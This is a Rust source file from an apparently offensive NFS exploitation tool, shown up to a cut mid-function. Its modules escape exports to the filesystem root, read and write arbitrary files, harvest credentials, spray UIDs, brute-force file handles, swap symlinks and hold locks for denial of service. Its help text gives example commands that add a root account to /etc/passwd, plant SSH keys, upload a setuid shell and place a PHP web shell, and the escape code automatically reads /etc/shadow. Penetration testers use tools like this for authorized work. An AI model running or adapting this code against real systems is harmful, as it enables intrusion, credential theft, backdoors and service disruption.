//! Automated exploitation modules.
//!
//! Attack modules are generic, composable operations. The `--escape` flag
//! can be added to any file-targeting module to first escape the export
//! to the filesystem root. Users choose what to read/write/upload  --  the
//! tool doesn't hardcode target paths.

use std::fmt::Write as _;
use std::io::Write as _;
use std::net::SocketAddr;
use std::sync::Arc;

use anyhow::Context as _;
use clap::{Parser, Subcommand};
use colored::Colorize as _;

use crate::cli::GlobalOpts;
use crate::engine::credential::CredentialManager;
use crate::engine::file_handle::FileHandleAnalyzer;
use crate::engine::fs_walker::{FsWalker, SecretPatterns, WalkConfig};
use crate::engine::uid_sprayer::{SprayConfig, UidSprayer, access_bits};
use crate::proto::auth::{AuthSys, Credential};
use crate::proto::circuit::CircuitBreaker;
use crate::proto::conn::ReconnectStrategy;
use crate::proto::mount::NfsMountClient;
use crate::proto::nfs3::client::Nfs3Client;
use crate::proto::nfs3::types::FileHandle;
use crate::proto::pool::{ConnectionPool, PoolKey};
use crate::util::stealth::StealthConfig;
use nfs3_types::nfs3::Nfs3Result;

/// Automated NFS exploitation modules for authorized assessments.
///
/// Modules:
///   escape        Escape export to filesystem root (subtree_check bypass)
///   read          Read any file (combine with --escape for out-of-export files)
///   write         Write / overwrite a file  [requires --allow-write]
///   upload        Upload a local file with controlled permissions  [--allow-write]
///   harvest       Recursively collect credentials and secrets
///   uid-spray     Find which UID/GID pairs can access a path
///   brute-handle  Brute-force NFS file handle space
///   symlink-swap  Replace a directory with a symlink  [--allow-write]
///   lock-dos      Hold NLM locks to prevent legitimate access
///
/// Typical workflow:
///   nfswolf attack escape HOST --export /srv
///   nfswolf attack read   HOST --export /srv --escape --path /etc/shadow
///   nfswolf shell         HOST --handle HEX
#[derive(Parser)]
pub struct AttackArgs {
    /// Required for write, upload, symlink-swap, and mknod operations.
    /// Protects against accidental writes during audits.
    #[arg(long, global = true)]
    pub allow_write: bool,

    #[command(subcommand)]
    pub module: AttackModule,
}

/// Common options for modules that operate on files within an export.
/// Combine with --escape or --handle to target files outside the export boundary.
#[derive(Parser, Clone)]
pub struct FileTargetOpts {
    /// Target NFS server (IP or hostname)
    pub host: String,

    /// Export path to mount on the server.
    /// Not required when --handle is given -- the handle bypasses MOUNT entirely.
    #[arg(long = "export", short = 'e', value_name = "PATH", required_unless_present = "handle")]
    pub export: Option<String>,

    /// Escape the export to the filesystem root before operating.
    /// Constructs a root handle via subtree_check bypass (ext4, xfs, btrfs).
    /// Use when the file you want is outside the exported directory.
    #[arg(long)]
    pub escape: bool,

    /// Use a raw root file handle (hex) instead of mounting an export.
    /// Obtain handles from `attack escape` or `attack brute-handle`.
    /// Conflicts with --escape (escape constructs a new handle at runtime).
    #[arg(long, value_name = "HEX", conflicts_with = "escape")]
    pub handle: Option<String>,

    /// UID for this operation (overrides global -u / --uid)
    #[arg(long, value_name = "UID")]
    pub uid: Option<u32>,

    /// GID for this operation (overrides global -g / --gid)
    #[arg(long, value_name = "GID")]
    pub gid: Option<u32>,

    /// Additional GIDs to include in the AUTH_SYS credential (comma-separated).
    /// Use to claim supplementary group membership (e.g. --aux-gids 42 for shadow on Debian).
    #[arg(long, value_delimiter = ',', value_name = "GID,...")]
    pub aux_gids: Vec<u32>,
}

#[derive(Subcommand)]
pub enum AttackModule {
    /// Escape export to filesystem root via subtree_check bypass.
    ///
    /// Tries to reach the filesystem root outside the exported directory by
    /// constructing a file handle with the root inode (ext4: 2, XFS: 128/64,
    /// BTRFS: 256+). The server accepts the handle without verifying it is
    /// within the export boundary.
    ///
    /// Strategy (automatic, no flags needed):
    ///   1. Probe known root inodes for the detected filesystem type.
    ///   2. If those return STALE, scan inodes 2-200 -- the root is always there.
    ///   3. For BTRFS, enumerate subvolume IDs starting at 256.
    ///
    /// The printed handle is verified live (GETATTR returns NFS3_OK or ACCES,
    /// not STALE) before being shown. Pass it to `shell --handle` to browse
    /// the full filesystem.
    ///
    /// Examples:
    ///   nfswolf attack escape 192.168.1.10 --export /srv
    ///   nfswolf attack escape 192.168.1.10 --export /srv --btrfs-subvols 32
    Escape {
        /// Target host (IP or hostname)
        host: String,
        /// Export path to mount and escape from
        #[arg(long = "export", short = 'e', value_name = "PATH")]
        export: String,
        /// Mount the escaped filesystem at a local directory (requires FUSE feature)
        #[arg(long, value_name = "DIR")]
        mount_at: Option<String>,
        /// Number of BTRFS subvolume IDs to try (starting at 256)
        #[arg(long, default_value = "16", value_name = "N")]
        btrfs_subvols: u32,
        /// Inode scan depth for the fallback brute-force pass (default: 200).
        /// The root inode is always within the first 200 inodes on any Linux
        /// filesystem, so the default covers all practical cases.
        #[arg(long, default_value = "200", value_name = "N")]
        max_root_scan: u32,
    },

    /// Read a file from the target.
    ///
    /// Generic file read  --  combine with --escape to read files outside
    /// the export boundary. Use --gid 42 for Debian shadow group access.
    ///
    /// Examples:
    ///   attack read target --export /srv --escape --path /etc/shadow --gid 42
    ///   attack read target --export /home --path /home/alice/.bashrc --uid 1000
    Read {
        #[command(flatten)]
        target: FileTargetOpts,

        /// Remote path to read (absolute from export root, or filesystem
        /// root if --escape is used)
        #[arg(long)]
        path: String,

        /// Write output to local file instead of stdout
        #[arg(short, long)]
        output: Option<String>,
    },

    /// Write content to a file on the target.
    ///
    /// Generic file write  --  combine with --escape to write anywhere.
    /// Use --append to add to existing files (e.g., authorized_keys).
    ///
    /// Examples:
    ///   attack write target --export /srv --escape --path /etc/passwd --append --data 'hacker:x:0:0::/root:/bin/bash'
    ///   attack write target --export /home --path /home/bob/.ssh/authorized_keys --uid 1000 --append --data 'ssh-rsa AAAA...'
    Write {
        #[command(flatten)]
        target: FileTargetOpts,

        /// Remote path to write
        #[arg(long)]
        path: String,

        /// Content to write (string). Mutually exclusive with --file.
        #[arg(long, group = "content")]
        data: Option<String>,

        /// Local file whose contents to write. Mutually exclusive with --data.
        #[arg(long, group = "content")]
        file: Option<String>,

        /// Append to existing file instead of overwriting
        #[arg(long)]
        append: bool,

        /// Set file mode after writing (octal, e.g., 0644)
        #[arg(long)]
        mode: Option<String>,
    },

    /// Upload a local file with specific permissions.
    ///
    /// Like write, but designed for binaries and permission-sensitive files.
    /// Use --suid to set the setuid bit (requires no_root_squash + uid 0).
    ///
    /// Examples:
    ///   attack upload target --export /srv --escape --file ./rootshell --path /tmp/.shell --suid --uid 0
    ///   attack upload target --export /srv --escape --file ./shell.php --path /var/www/html/cmd.php
    Upload {
        #[command(flatten)]
        target: FileTargetOpts,

        /// Local file to upload
        #[arg(long)]
        file: String,

        /// Remote path to place the file
        #[arg(long)]
        path: String,

        /// Set the SUID bit on the uploaded file (requires no_root_squash + uid 0)
        #[arg(long)]
        suid: bool,

        /// Set the SGID bit on the uploaded file
        #[arg(long)]
        sgid: bool,

        /// File mode (octal, e.g., 0755). Defaults to 0755 if --suid, else 0644.
        #[arg(long)]
        mode: Option<String>,
    },

    /// Recursively harvest credentials and secrets from the target.
    ///
    /// Walks the filesystem looking for SSH keys, .env files, configs,
    /// database dumps, and other sensitive files. Combine with --escape
    /// to search the entire filesystem.
    ///
    /// Examples:
    ///   attack harvest target --export /home
    ///   attack harvest target --export /srv --escape
    ///   attack harvest target --export /srv --handle 0x01000200...
    Harvest {
        #[command(flatten)]
        target: FileTargetOpts,

        /// Output directory for found secrets
        #[arg(short, long, default_value = "./loot")]
        output: String,

        /// Maximum depth to recurse
        #[arg(long, default_value = "10")]
        depth: u32,

        /// Additional filename patterns to match (glob syntax, comma-separated)
        #[arg(long, value_delimiter = ',')]
        patterns: Vec<String>,

        /// Compute SHA-256 hashes of downloaded files
        #[arg(long)]
        hash: bool,
    },

    /// Spray UIDs/GIDs to discover which identities can access files.
    UidSpray {
        /// Target host
        host: String,
        /// Export path
        #[arg(long)]
        export: String,
        /// UID range start
        #[arg(long, default_value = "0")]
        uid_start: u32,
        /// UID range end
        #[arg(long, default_value = "65535")]
        uid_end: u32,
        /// GID range start
        #[arg(long, default_value = "0")]
        gid_start: u32,
        /// GID range end
        #[arg(long, default_value = "65535")]
        gid_end: u32,
        /// Path to check access against
        #[arg(long, default_value = "/")]
        path: String,
        /// Auxiliary GIDs to include in each attempt (comma-separated)
        #[arg(long, value_delimiter = ',')]
        aux_gids: Vec<u32>,
        /// Delay between attempts in ms (independent of global --delay)
        #[arg(long, default_value = "0")]
        attempt_delay: u64,
    },

    /// Brute-force NFS file handles.
    ///
    /// Generates candidate handles based on detected filesystem type
    /// and tests each with GETATTR. Useful when exports are restricted
    /// but the server accepts forged handles.
    ///
    /// Requires a seed handle (from a successful MOUNT or escape) to derive
    /// the FSID and handle format. Iterates inode numbers from that base.
    ///
    /// Examples:
    ///   nfswolf attack brute-handle 192.168.1.10 --export /srv --seed-handle 01000200...
    ///   nfswolf attack brute-handle 192.168.1.10 --export /srv --seed-handle 01000200... --fs-type xfs --max-attempts 50000
    BruteHandle {
        /// Target host (IP or hostname)
        host: String,
        /// Filesystem type to guide candidate generation (ext4, xfs, btrfs)
        #[arg(long, default_value = "ext4", value_name = "TYPE")]
        fs_type: String,
        /// Known handle (hex, required) from a prior mount or escape.
        /// Used to derive the filesystem ID and handle format.
        /// Obtain via `shell ... -c handle` or from the escape output.
        #[arg(long, required = true, value_name = "HEX")]
        seed_handle: String,
        /// Maximum number of handles to probe
        #[arg(long, default_value = "10000", value_name = "N")]
        max_attempts: u64,
        /// Fix inode to this value and sweep generations instead of sweeping inodes.
        /// Use when STALE oracle confirms the inode exists but generation is unknown.
        /// Example: --fixed-inode 2 to brute-force the generation of the ext4 root.
        #[arg(long, value_name = "INODE")]
        fixed_inode: Option<u32>,
        /// Generation range start (used with --fixed-inode)
        #[arg(long, default_value = "0", value_name = "GEN")]
        gen_start: u32,
        /// Generation range end (used with --fixed-inode; 0 = use max_attempts from gen_start)
        #[arg(long, default_value = "0", value_name = "GEN")]
        gen_end: u32,
    },

    /// Replace a nested export directory with a symlink.
    ///
    /// If a parent export is writable and a child directory exists within it,
    /// the child can be replaced with a symlink pointing anywhere on the
    /// server's filesystem. Requires write access to the parent.
    SymlinkSwap {
        /// Target host
        host: String,
        /// Parent export path (must be writable)
        #[arg(long)]
        parent_export: String,
        /// Child directory name to replace with symlink
        #[arg(long)]
        child_name: String,
        /// Symlink target path on the server (e.g., /etc, /root, /)
        #[arg(long)]
        link_target: String,
    },

    /// Acquire NLM locks on target files (denial of service).
    LockDos {
        /// Target host.
        host: String,
        /// Export path.
        #[arg(long)]
        export: String,
        /// Files to lock (relative to export, comma-separated).
        #[arg(long, value_delimiter = ',')]
        files: Vec<String>,
        /// Maximum number of concurrent locks to acquire (measures server lock table capacity).
        /// Locks are acquired on successive 1-byte ranges [0..1], [1..2], etc.
        #[arg(long, default_value = "1")]
        count: u32,
        /// Hold locks indefinitely (otherwise release after --hold-secs).
        #[arg(long)]
        hold_forever: bool,
        /// Seconds to hold locks before releasing.
        #[arg(long, default_value = "300")]
        hold_secs: u64,
    },
}

/// Run the attack command, dispatching to the chosen module.
pub async fn run(args: AttackArgs, globals: &GlobalOpts) -> anyhow::Result<()> {
    // Enforce --allow-write for modules that perform write operations (Design Rule #8).
    if !args.allow_write {
        let requires_write = matches!(args.module, AttackModule::Write { .. } | AttackModule::Upload { .. } | AttackModule::SymlinkSwap { .. });
        if requires_write {
            anyhow::bail!("write operations require --allow-write flag (Design Rule #8)");
        }
    }

    let stealth = StealthConfig::new(globals.delay, globals.jitter);

    match args.module {
        AttackModule::Escape { host, export, btrfs_subvols, max_root_scan, .. } => run_escape(&host, &export, btrfs_subvols, max_root_scan).await,
        AttackModule::Read { target, path, output } => run_read(&target, &path, output.as_deref(), globals, &stealth).await,
        AttackModule::Write { target, path, data, file, append, .. } => run_write(&target, &path, data.as_deref(), file.as_deref(), append, globals, &stealth).await,
        AttackModule::Upload { target, file, path, suid, .. } => run_upload(&target, &file, &path, suid, globals, &stealth).await,
        AttackModule::Harvest { target, output, depth, patterns, hash } => run_harvest(&target, &output, depth, &patterns, hash, globals, &stealth).await,
        AttackModule::UidSpray { host, export, uid_start, uid_end, gid_start, gid_end, path, aux_gids, attempt_delay } => run_uid_spray(&host, &export, uid_start..=uid_end, gid_start..=gid_end, &path, &aux_gids, attempt_delay, &stealth).await,
        AttackModule::BruteHandle { host, fs_type, seed_handle, max_attempts, fixed_inode, gen_start, gen_end } => run_brute_handle(&host, &fs_type, &seed_handle, max_attempts, fixed_inode, gen_start, gen_end, &stealth).await,
        AttackModule::SymlinkSwap { host, parent_export, child_name, link_target } => run_symlink_swap(&host, &parent_export, &child_name, &link_target, &stealth).await,
        AttackModule::LockDos { host, export, files, count, hold_forever, hold_secs } => run_lock_dos(&host, &export, &files, count, hold_forever, hold_secs).await,
    }
}

// --- Connection helpers ---

/// Parse a host string into a `SocketAddr` using NFS port 2049.
fn parse_addr(host: &str) -> anyhow::Result<SocketAddr> {
    // Try direct parse first (handles host:port format).
    if let Ok(addr) = host.parse::<SocketAddr>() {
        return Ok(addr);
    }
    // Append default NFS port.
    format!("{host}:2049").parse::<SocketAddr>().with_context(|| format!("invalid host: {host}"))
}

/// Build an Nfs3Client for the given host, export, and credential.
fn make_client(addr: SocketAddr, export: &str, uid: u32, gid: u32, aux_gids: &[u32], stealth: StealthConfig) -> (Arc<ConnectionPool>, Arc<CircuitBreaker>, Nfs3Client) {
    let pool = Arc::new(ConnectionPool::default_config());
    let circuit = Arc::new(CircuitBreaker::default_config());
    let gids = build_gid_list(gid, aux_gids);
    let auth = AuthSys::with_groups(uid, gid, &gids, "nfswolf");
    let cred = Credential::Sys(auth);
    let key = PoolKey { host: addr, export: export.to_owned(), uid, gid };
    let client = Nfs3Client::new(Arc::clone(&pool), key, Arc::clone(&circuit), stealth, cred, ReconnectStrategy::Persistent);
    (pool, circuit, client)
}

/// Build an Nfs3Client that connects directly to NFS port 2049, bypassing MOUNT.
///
/// Used when the caller already has a file handle (from escape or brute-handle).
/// File handles are bearer tokens (RFC 1094 S2.3.3) -- the TCP connection just
/// needs to reach port 2049; no MOUNT RPC is required.
fn make_client_direct(addr: SocketAddr, uid: u32, gid: u32, aux_gids: &[u32], stealth: StealthConfig) -> (Arc<ConnectionPool>, Arc<CircuitBreaker>, Nfs3Client) {
    let pool = Arc::new(ConnectionPool::default_config());
    let circuit = Arc::new(CircuitBreaker::default_config());
    let gids = build_gid_list(gid, aux_gids);
    let auth = AuthSys::with_groups(uid, gid, &gids, "nfswolf");
    let cred = Credential::Sys(auth);
    // Empty export in the pool key -- direct connections never call MOUNT.
    let key = PoolKey { host: addr, export: String::new(), uid, gid };
    let client = Nfs3Client::new_direct(Arc::clone(&pool), key, Arc::clone(&circuit), stealth, cred, ReconnectStrategy::Persistent, 2049);
    (pool, circuit, client)
}

/// Build the GID list for AUTH_SYS: primary GID first, then aux GIDs (deduped).
fn build_gid_list(gid: u32, aux_gids: &[u32]) -> Vec<u32> {
    let mut gids = vec![gid];
    for &g in aux_gids {
        if !gids.contains(&g) {
            gids.push(g);
        }
    }
    gids
}

/// Build the right client for a set of `FileTargetOpts`.
///
/// When `--handle` is given, the connection bypasses MOUNT (bearer token,
/// RFC 1094 S2.3.3). Otherwise it mounts the export normally.
fn make_client_for_opts(addr: SocketAddr, opts: &FileTargetOpts, uid: u32, gid: u32, stealth: StealthConfig) -> (Arc<ConnectionPool>, Arc<CircuitBreaker>, Nfs3Client) {
    if opts.handle.is_some() {
        make_client_direct(addr, uid, gid, &opts.aux_gids, stealth)
    } else {
        let export = opts.export.as_deref().unwrap_or("/");
        make_client(addr, export, uid, gid, &opts.aux_gids, stealth)
    }
}

/// Format the target string for status lines: "host:export" or "host (handle)" .
fn target_label(opts: &FileTargetOpts) -> String {
    opts.export.as_ref().map_or_else(|| format!("{} (handle)", opts.host), |exp| format!("{}:{exp}", opts.host))
}

/// Resolve the working file handle: either use a provided hex handle, mount the
/// export, or escape the export to the filesystem root.
///
/// When `--handle` is given, returns the parsed handle directly (no MOUNT needed).
/// When `--escape` is given, mounts the export and constructs the root handle.
/// Otherwise mounts the export and returns its root handle.
async fn resolve_fh(opts: &FileTargetOpts) -> anyhow::Result<FileHandle> {
    // Raw handle bypasses MOUNT entirely (RFC 1094 S2.3.3 -- bearer token).
    if let Some(hex) = &opts.handle {
        return FileHandle::from_hex(hex).context("invalid hex file handle");
    }

    // Export is guaranteed Some when handle is None (enforced by clap required_unless_present).
    let export = opts.export.as_deref().unwrap_or("/");
    let addr = parse_addr(&opts.host)?;
    let mount = NfsMountClient::new();
    let mnt = mount.mount(addr, export).await?;

    if opts.escape {
        let escape = FileHandleAnalyzer::construct_escape_handle(&mnt.handle).ok_or_else(|| anyhow::anyhow!("export escape not supported for this filesystem type"))?;
        tracing::info!(
            fs_type = ?escape.fs_type,
            confidence = escape.confidence,
            handle = escape.root_handle.to_hex(),
            "escape handle constructed"
        );
        return Ok(escape.root_handle);
    }

    Ok(mnt.handle)
}

/// Lookup a path component by component from a root handle.
///
/// On ACCES, retries with credential escalation: tries the directory owner's
/// UID (from READDIRPLUS on parent), then root, then common service UIDs.
/// File handles are bearer tokens (RFC 1094 S2.3.3) -- once obtained via
/// ANY credential they work with any other credential. So we only need the
/// right UID for the LOOKUP traverse, not for subsequent operations.
async fn lookup_path(client: &Nfs3Client, root: &FileHandle, path: &str) -> anyhow::Result<FileHandle> {
    use nfs3_types::nfs3::{LOOKUP3args, Nfs3Result, diropargs3, filename3, nfsstat3};

    let components: Vec<&str> = path.split('/').filter(|s| !s.is_empty()).collect();
    let mut current = root.clone();

    for component in components {
        let args = LOOKUP3args { what: diropargs3 { dir: current.to_nfs_fh3(), name: filename3::from(component.as_bytes()) } };
        let res = client.lookup(&args).await?;
        match res {
            Nfs3Result::Ok(ok) => {
                current = FileHandle::from_nfs_fh3(&ok.object);
            },
            Nfs3Result::Err((nfsstat3::NFS3ERR_ACCES, _)) => {
                // Permission denied -- try credential escalation.
                // First, get the directory owner via GETATTR on the current handle.
                let owner_uid = get_owner_uid(client, &current).await;
                let try_uids = build_escalation_uids((client.uid(), client.gid()), owner_uid);

                let mut resolved = false;
                for (uid, gid) in &try_uids {
                    let esc_client = client.with_credential(Credential::Sys(AuthSys::with_groups(*uid, *gid, &[*gid], "nfswolf")), *uid, *gid);
                    let esc_args = LOOKUP3args { what: diropargs3 { dir: current.to_nfs_fh3(), name: filename3::from(component.as_bytes()) } };
                    if let Ok(Nfs3Result::Ok(ok)) = esc_client.lookup(&esc_args).await {
                        tracing::debug!(component, uid, gid, "LOOKUP succeeded with escalated credential");
                        current = FileHandle::from_nfs_fh3(&ok.object);
                        resolved = true;
                        break;
                    }
                }
                if !resolved {
                    anyhow::bail!("LOOKUP {component}: NFS3ERR_ACCES (tried {} credentials)", try_uids.len());
                }
            },
            Nfs3Result::Err((stat, _)) => {
                anyhow::bail!("LOOKUP {component}: {stat:?}");
            },
        }
    }

    Ok(current)
}

/// Get the owner UID of a file/directory handle via GETATTR.
/// Returns None on any error (best-effort).
async fn get_owner_uid(client: &Nfs3Client, fh: &FileHandle) -> Option<(u32, u32)> {
    use nfs3_types::nfs3::{GETATTR3args, Nfs3Result};
    let args = GETATTR3args { object: fh.to_nfs_fh3() };
    match client.getattr(&args).await {
        Ok(Nfs3Result::Ok(ok)) => Some((ok.obj_attributes.uid, ok.obj_attributes.gid)),
        _ => None,
    }
}

/// Alias so call sites read naturally.
use crate::engine::credential::escalation_list as build_escalation_uids;

/// Walk a path like `lookup_path`, but CREATE the final component if it doesn't exist.
///
/// Intermediate directories are resolved via `lookup_path` (with auto-escalation).
/// Only the leaf file is created. Used by write/upload.
async fn lookup_or_create(client: &Nfs3Client, root: &FileHandle, path: &str) -> anyhow::Result<FileHandle> {
    use nfs3_types::nfs3::{CREATE3args, LOOKUP3args, Nfs3Result, createhow3, diropargs3, filename3, nfsstat3, sattr3};

    let components: Vec<&str> = path.split('/').filter(|s| !s.is_empty()).collect();
    if components.is_empty() {
        anyhow::bail!("empty path");
    }

    // Walk all but the last component using lookup_path (auto-escalation on ACCES).
    let parent_path: String = components.get(..components.len() - 1).unwrap_or(&[]).join("/");
    let current = if parent_path.is_empty() { root.clone() } else { lookup_path(client, root, &parent_path).await? };

    // Last component: LOOKUP first, CREATE if not found.
    let leaf = components.last().ok_or_else(|| anyhow::anyhow!("empty path"))?;
    let lookup_args = LOOKUP3args { what: diropargs3 { dir: current.to_nfs_fh3(), name: filename3::from(leaf.as_bytes()) } };
    let res = client.lookup(&lookup_args).await?;
    match res {
        Nfs3Result::Ok(ok) => Ok(FileHandle::from_nfs_fh3(&ok.object)),
        Nfs3Result::Err((nfsstat3::NFS3ERR_NOENT, _)) => {
            // File doesn't exist -- create it with mode 0644 (sattr3::default()
            // leaves mode as None/don't-set, which on CREATE means mode 0).
            let attrs = sattr3 { mode: nfs3_types::nfs3::Nfs3Option::Some(0o644), ..sattr3::default() };
            let create_args = CREATE3args { where_: diropargs3 { dir: current.to_nfs_fh3(), name: filename3::from(leaf.as_bytes()) }, how: createhow3::UNCHECKED(attrs) };
            let create_res = client.create(&create_args).await?;
            match create_res {
                Nfs3Result::Ok(ok) => {
                    if let nfs3_types::nfs3::Nfs3Option::Some(ref fh) = ok.obj {
                        Ok(FileHandle::from_nfs_fh3(fh))
                    } else {
                        anyhow::bail!("CREATE {leaf}: server returned no file handle")
                    }
                },
                Nfs3Result::Err((stat, _)) => anyhow::bail!("CREATE {leaf}: {stat:?}"),
            }
        },
        Nfs3Result::Err((stat, _)) => anyhow::bail!("LOOKUP {leaf}: {stat:?}"),
    }
}

// --- Module implementations ---

/// Probe a candidate handle with GETATTR and report whether it is a valid directory.
///
/// Two acceptance conditions:
/// - `NFS3_OK` AND `file_type == NF3DIR` -- handle is valid and points to a directory.
///   The directory check prevents false positives from non-root inodes that happen to
///   exist: on ext4, inode 128 is the journal (a regular file), not a directory, so it
///   is correctly rejected when probed as an XFS root candidate.
/// - `NFS3ERR_ACCES` / `NFS3ERR_PERM` -- handle format was accepted (root_squash
///   blocks uid=0 reads on the root dir).  We cannot verify the file type here but
///   ACCES on a GETATTR is almost exclusively returned for directories.
async fn probe_escape_candidate(client: &Nfs3Client, candidate: &crate::engine::file_handle::EscapeResult) -> bool {
    use nfs3_types::nfs3::{GETATTR3args, Nfs3Result, ftype3, nfsstat3};
    let args = GETATTR3args { object: candidate.root_handle.to_nfs_fh3() };
    match client.getattr(&args).await {
        Ok(Nfs3Result::Ok(ok)) => ok.obj_attributes.type_ == ftype3::NF3DIR,
        Ok(Nfs3Result::Err((nfsstat3::NFS3ERR_ACCES | nfsstat3::NFS3ERR_PERM, _))) => true,
        _ => false,
    }
}

/// Print the successful escape result and next-step hints, then return.
fn print_escape_success(candidate: &crate::engine::file_handle::EscapeResult, note: &str, host: &str) {
    let hex = candidate.root_handle.to_hex();
    println!();
    println!("  {}  {:?}  (inode {}  {})", "Filesystem:".dimmed(), candidate.fs_type, candidate.inode_number, note);
    crate::output::print_handle("Root handle", &hex);
    crate::output::print_handle_next_steps(&hex, host);
    println!();
}

/// After a successful escape, automatically try to read /etc/shadow.
///
/// On Debian/Ubuntu, /etc/shadow is mode 0640 owned by root:shadow (GID 42).
/// On SUSE, shadow GID is 15.
/// This is the same check nfs_analyze performs post-escape (nfs_analyze.py:490).
/// Reading succeeds even without no_root_squash because we can claim GID 42/15.
async fn try_read_shadow_post_escape(client: &Nfs3Client, root_fh: &FileHandle) {
    use crate::proto::auth::{AuthSys, Credential};
    use crate::proto::nfs3::types::FileHandle;
    use nfs3_types::nfs3::{LOOKUP3args, Nfs3Result, READ3args, diropargs3, filename3};
    use nfs3_types::xdr_codec::Opaque;

    // Shadow GIDs: 42 = Debian/Ubuntu, 15 = SUSE/openSUSE
    const SHADOW_GIDS: &[(u32, &str)] = &[(42, "Debian/Ubuntu shadow"), (15, "SUSE shadow")];

    // LOOKUP /etc
    let etc_args = LOOKUP3args { what: diropargs3 { dir: root_fh.to_nfs_fh3(), name: filename3(Opaque::owned(b"etc".to_vec())) } };
    let etc_fh = match client.lookup(&etc_args).await {
        Ok(Nfs3Result::Ok(ok)) => FileHandle::from_nfs_fh3(&ok.object),
        _ => return,
    };

    // LOOKUP /etc/shadow
    let shadow_args = LOOKUP3args { what: diropargs3 { dir: etc_fh.to_nfs_fh3(), name: filename3(Opaque::owned(b"shadow".to_vec())) } };
    let shadow_fh = if let Ok(Nfs3Result::Ok(ok)) = client.lookup(&shadow_args).await {
        FileHandle::from_nfs_fh3(&ok.object)
    } else {
        eprintln!("{}", crate::output::status_info("/etc/shadow not found (non-standard OS or no shadow file)"));
        return;
    };

    for &(gid, label) in SHADOW_GIDS {
        let cred = Credential::Sys(AuthSys::with_groups(0, gid, &[gid], "nfswolf"));
        let shadow_client = client.with_credential(cred, 0, gid);
        let read_args = READ3args { file: shadow_fh.to_nfs_fh3(), offset: 0, count: 65536 };
        if let Ok(Nfs3Result::Ok(ok)) = shadow_client.read(&read_args).await {
            let content = String::from_utf8_lossy(ok.data.as_ref());
            eprintln!("{}", crate::output::status_ok(&format!("/etc/shadow readable via GID {gid} ({label}):")));
            for line in content.lines().take(10) {
                println!("  {line}");
            }
            return;
        }
    }

    eprintln!("{}", crate::output::status_info("/etc/shadow: not readable via shadow GID (root_squash active or shadow hardened)"));
}

/// Run the `escape` module.
///
/// Strategy (fully automatic, no flags needed):
///   1. Mount the export and detect the filesystem type from the handle format.
///   2. Probe known root inodes for the detected type:
///      - ext4: inode 2 (always the root; RFC 1813 extension, Linux vfs)
///      - XFS:  inode 128 (v5/mkfs default), then inode 64 (v4 / -i size=256)
///      - BTRFS: subvolume IDs 256..256+btrfs_subvols
///   3. If all known candidates return STALE, fall back to scanning inodes
///      2..=max_root_scan. The filesystem root is always within the first 200
///      inodes on any Linux filesystem, so the default covers every case.
///
/// The printed handle is confirmed live (GETATTR returns NFS3_OK or ACCES) before
/// being shown. ACCES counts as a hit -- the handle format is valid; only the
/// credential is rejected. Pass the handle to `shell --handle` to browse the FS.
async fn run_escape(host: &str, export: &str, btrfs_subvols: u32, max_root_scan: u32) -> anyhow::Result<()> {
    use nfs3_types::nfs3::nfsstat3;
    eprintln!("{}", crate::output::status_info(&format!("Escaping export {host}:{export}")));
    let addr = parse_addr(host)?;
    let mount = NfsMountClient::new();
    let mnt = mount.mount(addr, export).await?;

    // Use uid=0 for probes so permission errors (squashed root) are distinguishable
    // from format errors (STALE/BADHANDLE). The handle is a bearer token; once we
    // have it the caller can use any credential (RFC 1094 S2.3.3).
    let (_, _, probe_client) = make_client(addr, export, 0, 0, &[], StealthConfig::new(0, 0));

    // --- Phase 1: known root inodes for the detected filesystem type ---

    // BTRFS: try subvolume IDs (256..256+btrfs_subvols) first, then fall through.
    let btrfs = FileHandleAnalyzer::construct_btrfs_subvol_handles(&mnt.handle, btrfs_subvols);
    for candidate in &btrfs {
        eprintln!("{}", crate::output::status_info(&format!("Probing BTRFS subvol {} ...", candidate.inode_number)));
        if probe_escape_candidate(&probe_client, candidate).await {
            print_escape_success(candidate, "subvolume (verified)", host);
            try_read_shadow_post_escape(&probe_client, &candidate.root_handle).await;
            return Ok(());
        }
    }

    // ext4 (inode 2) and XFS known candidates (128, 64).
    // Fingerprint first so we don't try XFS inodes on ext4 (inode 128 on ext4 is
    // a real but non-root file; accepting it would give a misleading "escape").
    let fs_type = FileHandleAnalyzer::fingerprint_fs(&mnt.handle);
    let known: Vec<crate::engine::file_handle::EscapeResult> = match fs_type {
        crate::engine::file_handle::FsType::Xfs => {
            // XFS: try inodes 128 (v5 default) and 64 (v4).
            FileHandleAnalyzer::construct_xfs_escape_candidates(&mnt.handle)
        },
        crate::engine::file_handle::FsType::Unknown | crate::engine::file_handle::FsType::Ext4 => {
            // Unknown: compound UUID format -- ambiguous ext4/XFS; try all candidates.
            // Ext4 fallback: fsid_type=0 + fileid_type=0x01/0x02 can appear on XFS too
            // when the server uses 32-bit-compatible inodes.  Queue inode 2 (ext4 root)
            // first, then XFS candidates (128, 64).  probe_escape_candidate rejects
            // non-directory hits, so inode 128 on a real ext4 (journal file) is safe.
            let mut candidates = FileHandleAnalyzer::construct_escape_handle(&mnt.handle).into_iter().collect::<Vec<_>>();
            candidates.extend(FileHandleAnalyzer::construct_xfs_escape_candidates(&mnt.handle));
            candidates
        },
        _ => {
            // BTRFS fallthrough already handled above; anything else uses inode 2.
            FileHandleAnalyzer::construct_escape_handle(&mnt.handle).into_iter().collect()
        },
    };

    for candidate in &known {
        eprintln!("{}", crate::output::status_info(&format!("Probing {:?} inode {} ...", candidate.fs_type, candidate.inode_number)));
        if probe_escape_candidate(&probe_client, candidate).await {
            print_escape_success(candidate, "verified", host);
            try_read_shadow_post_escape(&probe_client, &candidate.root_handle).await;
            return Ok(());
        }
    }

    // --- Phase 2: fallback scan (inodes 2..=max_root_scan) ---
    //
    // If known candidates all returned STALE the filesystem uses a non-standard root
    // inode. This is rare but happens with old mkfs.xfs defaults and some appliances.
    // The root inode is always within the first max_root_scan inodes (default 200)
    // on any Linux filesystem, so this scan is bounded and fast.
    if !known.is_empty() {
        eprintln!("{}", crate::output::status_warn(&format!("Known candidates returned STALE -- scanning inodes 2..={max_root_scan}")));
    }

    // Derive seed from the export handle to get the correct FSID and format.
    let seed = &mnt.handle;
    let mut found_stale = false;

    for inode in 2..=max_root_scan {
        let Some(candidate) = FileHandleAnalyzer::construct_handle_for_inode(seed, inode, 0) else {
            continue;
        };

        let args = nfs3_types::nfs3::GETATTR3args { object: candidate.root_handle.to_nfs_fh3() };
        match probe_client.getattr(&args).await {
            Ok(Nfs3Result::Ok(ok)) if ok.obj_attributes.type_ == nfs3_types::nfs3::ftype3::NF3DIR => {
                // Only accept directories -- regular files are inodes inside the export, not roots.
                print_escape_success(&candidate, "found via scan", host);
